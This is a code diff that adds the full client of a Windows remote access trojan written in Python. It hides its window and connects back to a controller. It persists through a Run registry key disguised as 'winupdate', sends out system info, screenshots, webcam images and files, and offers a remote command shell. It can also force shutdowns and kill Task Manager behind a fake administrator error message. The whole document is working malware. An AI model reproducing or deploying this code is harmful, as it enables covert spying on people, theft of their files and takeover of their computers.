@@ -1,0 +1,276 @@
+import socket, os, sys, platform, pyautogui, time, ctypes, subprocess, webbrowser, threading
+import win32console, win32gui, win32api, winerror, win32event, win32ui
+import pygame.camera, pygame.image
+from shutil import copyfile
+from winreg import *
+from urllib.request import urlopen
+
+# sys.stderr = None  # prevent errors from being shown
+
+strHost = ""
+# strHost = socket.gethostbyname("")
+intPort = 3000
+
+strPath = os.path.realpath(sys.argv[0])  # get file path
+TMP = os.environ["TEMP"]  # get temp path
+APPDATA = os.environ["APPDATA"]
+
+# hex vales for ctypes Message Box
+MB_OK = 0x0
+ICON_INFO = 0x40
+ICON_STOP = 0x10
+
+MessageBox = ctypes.windll.user32.MessageBoxW
+
+
+def hide():  # hide window
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window, 0)
+    return True
+hide()
+
+# function to prevent multiple instances
+mutex = win32event.CreateMutex(None, 1, "PA_mutex_xp4")
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    sys.exit(0)
+
+
+while True:  # infinite loop until socket can connect
+    try:
+        objSocket = socket.socket()
+        objSocket.connect((strHost, intPort))
+    except socket.error:
+        time.sleep(10)  # wait 10 seconds to try again
+    else: break
+
+# function to return decoded utf-8
+decode_utf8 = lambda data: data.decode("utf-8")
+
+
+def recvall(buffer):  # function to receive large amounts of data
+    bytData = b""
+    while True:
+        bytPart = objSocket.recv(buffer)
+        bytData += bytPart
+        if len(bytData) == buffer:
+            break
+    return bytData
+
+
+def msg(data):
+    # use ctypes to create messagebox instead of tkinter to save on dependencies
+    strMsg = data[3:len(data)]
+    MessageBox(None, strMsg, "Message", MB_OK | ICON_INFO)
+
+
+def startup():
+    try:
+        strAppPath = APPDATA + "\\" + os.path.basename(strPath)
+        copyfile(strPath, strAppPath)
+
+        objRegKey = OpenKey(HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, KEY_ALL_ACCESS)
+        SetValueEx(objRegKey, "winupdate", 0, REG_SZ, strAppPath); CloseKey(objRegKey)
+    except WindowsError:
+        objSocket.send(str.encode("Unable to add to startup!"))
+    else:
+        objSocket.send(str.encode("success"))
+
+
+def info():
+    strOS = platform.system() + " " + platform.release()
+    strPCName = socket.gethostname()
+
+    try:
+        strIP = urlopen("http://ident.me").read().decode('utf8')  # get external ip
+    except: strIP = "?"
+
+    strIP = strIP + " | " + socket.gethostbyname(strPCName)
+    strUser = os.environ["USERNAME"]
+
+    strInfo = "OS: " + strOS + "\n" + "PC Name: " + strPCName + "\n" + "IP: " + \
+              strIP + "\n" + "Username: " + strUser + "\n"
+    objSocket.send(str.encode(strInfo))
+
+
+def screenshot():
+    pyautogui.screenshot().save(TMP + "/s.png")  # take screenshot
+    objSocket.send(str.encode("Receiving Screenshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
+                              + " bytes" + "\n" + "Please wait..."))
+    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
+    time.sleep(1)
+    objSocket.send(objPic.read())
+    objPic.close()
+
+
+def webcam_pic():
+    try:
+        pygame.camera.init()
+        objCam = pygame.camera.Camera(pygame.camera.list_cameras()[0])  # get default webcam
+        objCam.start()
+        pygame.image.save(objCam.get_image(), TMP + "/s.png")
+        pygame.camera.quit()
+        objCam.stop()
+    except:
+        objSocket.send(str.encode("error"))
+        return
+
+    objSocket.send(str.encode("Receiving Snapshot" + "\n" + "File size: " + str(os.path.getsize(TMP + "/s.png"))
+                              + " bytes" + "\n" + "Please wait..."))
+    objPic = open(TMP + "/s.png", "rb")  # send file contents and close the file
+    time.sleep(1)
+    objSocket.send(objPic.read())
+    objPic.close()
+
+
+def file_browser():
+    arRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives
+    arRawDrives = arRawDrives.split('\000')[:-1]
+
+    strDrives = ""
+    for drive in arRawDrives:  # get proper view and place array into string
+        strDrives += drive.replace("\\", "") + "\n"
+    objSocket.send(str.encode(strDrives))
+
+    strDir = objSocket.recv(1024).decode("utf-8")
+
+    if os.path.isdir(strDir):
+        arFiles = os.listdir(strDir)
+
+        strFiles = ""
+        for file in arFiles:
+            strFiles += (file + "\n")
+
+        objSocket.send(str.encode(str(len(strFiles))))  # send buffer size
+        time.sleep(0.1)
+        objSocket.send(str.encode(strFiles))
+
+    else:  # if the user entered an invalid directory
+        objSocket.send(str.encode("Invalid Directory!"))
+        return
+
+
+def upload(data):
+    intBuffer = int(data)
+    file_data = recvall(intBuffer)
+    strOutputFile = objSocket.recv(1024).decode("utf-8")
+
+    try:
+        objFile = open(strOutputFile, "wb")
+        objFile.write(file_data)
+        objFile.close()
+        objSocket.send(str.encode("Done!!!"))
+    except:
+        objSocket.send(str.encode("Path is protected/invalid!"))
+
+
+def receive(data):
+    if not os.path.isfile(data):
+        objSocket.send(str.encode("Target file not found!"))
+        return
+
+    objSocket.send(str.encode("File size: " + str(os.path.getsize(data))
+                              + " bytes" + "\n" + "Please wait..."))
+    objFile = open(data, "rb")  # send file contents and close the file
+    time.sleep(1)
+    objSocket.send(objFile.read())
+    objFile.close()
+
+
+def shut_res_lock():
+    strChoice = objSocket.recv(1024).decode("utf-8")
+
+    if strChoice == "lock":
+        ctypes.windll.user32.LockWorkStation()  # lock pc
+        return
+    elif strChoice[3:7] == "none":
+        command = "shutdown " + strChoice[0:2] + " -f -t 0"
+        subprocess.Popen(command.split(), shell=True)
+    else:
+        command = ("shutdown " + strChoice[0:2] + " -f -t 5 -c").split()
+        command.append(strChoice[3:len(strChoice)])
+        subprocess.Popen(command, shell=True)
+    objSocket.close()  # close connection and exit
+    sys.exit(0)
+
+
+def command_shell():
+    strCurrentDir = str(os.getcwd())
+
+    objSocket.send(str.encode(strCurrentDir))
+
+    while True:
+        strData = objSocket.recv(1024).decode("utf-8")
+
+        if strData == "goback":
+            os.chdir(strCurrentDir)  # change directory back to original
+            break
+
+        elif strData[:2].lower() == "cd" or strData[:5].lower() == "chdir":
+            objCommand = subprocess.Popen(strData + " & cd", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            if (objCommand.stderr.read()).decode("utf-8") == "":  # if there is no error
+                strOutput = (objCommand.stdout.read()).decode("utf-8").splitlines()[0]  # decode and remove new line
+                os.chdir(strOutput)  # change directory
+
+                bytData = str.encode("\n" + str(os.getcwd()) + ">")  # output to send the server
+
+        elif len(strData) > 0:
+            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode("utf-8", errors="replace")  # since cmd uses bytes, decode it
+
+            bytData = str.encode(strOutput + "\n" + str(os.getcwd()) + ">")
+        else:
+            bytData = str.encode("Error!!!")
+
+        strBuffer = str(len(bytData))
+        objSocket.send(str.encode(strBuffer))  # send buffer size
+        time.sleep(0.1)
+        objSocket.send(bytData)  # send output
+
+
+def disable_taskmgr():
+    while True:
+        time.sleep(0.5)  # check every half second
+        try:
+            win32ui.FindWindow(None, "Windows Task Manager")
+        except win32ui.error:
+            continue
+        subprocess.Popen(["taskkill", "/f", "/im", "taskmgr.exe"], shell=True)
+
+        # fake error message
+        MessageBox(None, "Task Manager has been disabled by your administrator.", "Task Manager", MB_OK | ICON_STOP)
+
+while True:
+    strData = objSocket.recv(1024)
+    strData = decode_utf8(strData)
+
+    if strData == "exit":
+        objSocket.close()
+        sys.exit(0)
+    elif strData[:3] == "msg":
+        msg(strData)
+    elif strData[:4] == "site":
+        webbrowser.open(strData[4:len(strData)])
+    elif strData == "startup":
+        startup()
+    elif strData == "info":
+        info()
+    elif strData == "screen":
+        screenshot()
+    elif strData == "filebrowser":
+        file_browser()
+    elif strData[:4] == "send":
+        upload(strData[4:len(strData)])
+    elif strData[:4] == "recv":
+        receive(strData[4:len(strData)])
+    elif strData == "shutreslock":
+        shut_res_lock()
+    elif strData == "test":
+        continue
+    elif strData == "cmd":
+        command_shell()
+    elif strData == "webpic":
+        webcam_pic()
+    elif strData == "dtaskmgr":
+        if not "objTaskmgr" in globals():  # check to make sure task manager is not already disabled
+            objTaskmgr = threading.Thread(target=disable_taskmgr, daemon=True).start()  # run function as new thread
